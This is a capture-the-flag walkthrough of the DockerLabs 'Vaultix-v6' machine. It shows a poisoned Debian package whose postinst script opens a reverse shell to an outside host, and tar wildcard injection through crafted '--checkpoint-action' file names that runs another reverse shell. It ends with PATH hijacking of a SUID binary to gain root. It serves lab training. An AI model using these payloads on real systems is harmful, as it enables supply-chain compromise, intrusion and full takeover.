The **Vaultix-v6** machine from DockerLabs is an engaging CTF challenge involving IPv6 neighbor reconnaissance, unrestricted DNS Zone Transfer (AXFR) discovery, CI/CD supply chain poisoning via an internal Debian package upload endpoint, lateral movement across multiple users (`d4fl0n`, `mario`, and `mikisbd`) leveraging backup archives and a classic tar wildcard vulnerability, and ultimately escalating to root via SUID binary PATH hijacking.

## Network Pivoting — IPv6 Port Forwarding via Socat

To facilitate browser testing and simplify tool interactions without requiring IPv6 flags on every command, we use `socat` to bind local IPv4 ports `80` and `53` to the target's IPv6 address.

```bash
socat TCP-LISTEN:80,fork 'TCP6:[fd00:dead:beef::2]:80'
socat TCP-LISTEN:53,fork 'TCP6:[fd00:dead:beef::2]:53'
```

## Exploitation — CI/CD Supply Chain Poisoning via Malicious .deb Package

Because packages uploaded to `/incoming/upload.php` are queued and validated/installed by an automated CI build agent, we can exploit this CI/CD pipeline by creating a malicious Debian package (`evil-deb.deb`). We place a reverse shell one-liner inside the `DEBIAN/postinst` script, which executes upon installation.

```bash
┌──(suraxddq㉿kali)-[~]
└─$ mkdir deb       

┌──(suraxddq㉿kali)-[~/deb]
└─$ mkdir -p evil-deb/DEBIAN

┌──(suraxddq㉿kali)-[~/deb]
└─$ cat evil-deb/DEBIAN/postinst
#!/bin/bash
/bin/bash -i >& /dev/tcp/192.168.0.35/1234 0>&1

┌──(suraxddq㉿kali)-[~/deb]
└─$ cat evil-deb/DEBIAN/control
Package: evilpackage
Version: 1.0
Section: utils
Priority: optional
Architecture: all
Maintainer: Hacker <hacker@example.com>
Description: This is a test package for CTF

┌──(suraxddq㉿kali)-[~/deb]
└─$ chmod +x evil-deb/DEBIAN/postinst  

┌──(suraxddq㉿kali)-[~/deb]
└─$ dpkg-deb --build evil-deb  
dpkg-deb: warning: root directory evil-deb has unusual owner or group 1000:1000
dpkg-deb: hint: you might need to pass --root-owner-group, see <https://wiki.debian.org/Teams/Dpkg/RootlessBuilds> for further details
dpkg-deb: warning: ignoring 1 warning about the control file(s)
dpkg-deb: building package 'evilpackage' in 'evil-deb.deb'.
```

We upload the package using `curl` with the staging credentials:

```bash
┌──(suraxddq㉿kali)-[~/deb]
└─$ curl -u repobot:V4ult1x_C1_2026! -F package=@evil-deb.deb http://vigilis-secure.vaultix.es/incoming/upload.php
OK: evil-deb.deb queued for validation.
```

## Lateral Movement — User Mikisbd via Tar Wildcard Injection

Now logged in as `mario`, we check our sudo permissions with `sudo -l`:

```bash
-bash-5.2$ sudo -l
Matching Defaults entries for mario on 7b87ff573db4:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User mario may run the following commands on 7b87ff573db4:
    (mikisbd) NOPASSWD: /usr/local/bin/backup-mikisbd.sh
```

User `mario` can execute `/usr/local/bin/backup-mikisbd.sh` as user `mikisbd` without a password. We examine the backup script:

```bash
-bash-5.2$ cat /usr/local/bin/backup-mikisbd.sh
#!/bin/bash
# Backs up mikisbd's data drop folder. Run by mario via sudo (see sudoers) as
# mikisbd - the target directory is group-writable by "ci-team" (mario's group)
# so the team can drop files there for backup.
cd /home/mikisbd/data || exit 1
tar -czf /tmp/mikisbd-backup.tar.gz *
chown mikisbd:mikisbd /tmp/mikisbd-backup.tar.gz
echo "Backup complete: /tmp/mikisbd-backup.tar.gz"
```

The script changes directory to `/home/mikisbd/data` (which is writable by `ci-team`, a group `mario` belongs to) and runs `tar -czf /tmp/mikisbd-backup.tar.gz *`.

Because wildcard expansion (`*`) passes file names directly as arguments to `tar`, this is vulnerable to **Tar Wildcard Injection** ([GTFOBins](https://gtfobins.github.io/gtfobins/tar/#sudo)). By creating files named `--checkpoint=1` and `--checkpoint-action=exec=...`, `tar` interprets them as command-line flags and executes our payload as user `mikisbd`.

We create the checkpoint files and a reverse shell script in `/home/mikisbd/data`:

```bash
-bash-5.2$ cd /home/mikisbd/data
-bash-5.2$ echo "" > '--checkpoint=1'
-bash-5.2$ echo "" > '--checkpoint-action=exec=sh privesc.sh'
-bash-5.2$ echo "bash -i >& /dev/tcp/172.17.0.1/5555 0>&1" > privesc.sh

-bash-5.2$ sudo -u mikisbd /usr/local/bin/backup-mikisbd.sh
```

We catch the reverse connection on listener port `5555`:

```bash
┌──(suraxddq㉿kali)-[~]
└─$ nc -nvlp 5555
listening on [any] 5555 ...
connect to [172.17.0.1] from (UNKNOWN) [172.17.0.3] 39584
bash-5.2$ script /dev/null -c bash
Script started, output log file is '/dev/null'.
bash-5.2$ 

bash-5.2$ id
uid=1002(mikisbd) gid=1004(mikisbd) groups=1004(mikisbd)
```

## Privilege Escalation — Root Access via SUID PATH Hijacking

Now operating as `mikisbd`, we search for binaries with the SUID bit set:

```bash
bash-5.2$ find / -perm /4000 -type f 2> /dev/null 
/usr/bin/chsh
/usr/bin/mount
/usr/bin/gpasswd
/usr/bin/chfn
/usr/bin/su
/usr/bin/newgrp
/usr/bin/umount
/usr/bin/passwd
/usr/bin/sudo
/usr/lib/openssh/ssh-keysign
/usr/local/bin/vaultix-status
```

The custom SUID binary `/usr/local/bin/vaultix-status` catches our attention. We run it to observe its behavior:

```bash
bash-5.2$ /usr/local/bin/vaultix-status
[vaultix-status] checking monitoring agent...
sh: 1: service: not found
```

The output `sh: 1: service: not found` reveals that the binary attempts to execute the `service` command without specifying an absolute path (e.g. `/usr/sbin/service`). This introduces a classic **PATH Hijacking** vulnerability.

We write a custom script named `service` in our current working directory that assigns SUID permissions to `/bin/bash` (`chmod 4777 /bin/bash`), make it executable, and prepend `.` to the `PATH` environment variable:

```bash
bash-5.2$ echo -e '#!/bin/bash
chmod 4777 /bin/bash' > service
bash-5.2$ chmod +x service 
bash-5.2$ export PATH=.:$PATH

bash-5.2$ /usr/local/bin/vaultix-status; ls -l /bin/bash
[vaultix-status] checking monitoring agent...
-rwsrwxrwx 1 root root 1265648 May  7 20:33 /bin/bash
```

The SUID bit on `/bin/bash` is now enabled. We spawn a root shell by executing `bash -p`:

```bash
bash-5.2$ bash -p
bash-5.2# id
uid=1000(d4fl0n) gid=1002(d4fl0n) euid=0(root) groups=1002(d4fl0n),1000(ci-team),1001(sysbackup)
```

With root privileges achieved, we read the final root flag:

```bash
bash-5.2# cd /root/
bash-5.2# ls
root.txt
bash-5.2# cat root.txt
VAULTIX{p4th_hij4ck_r00t_vigilis}
```
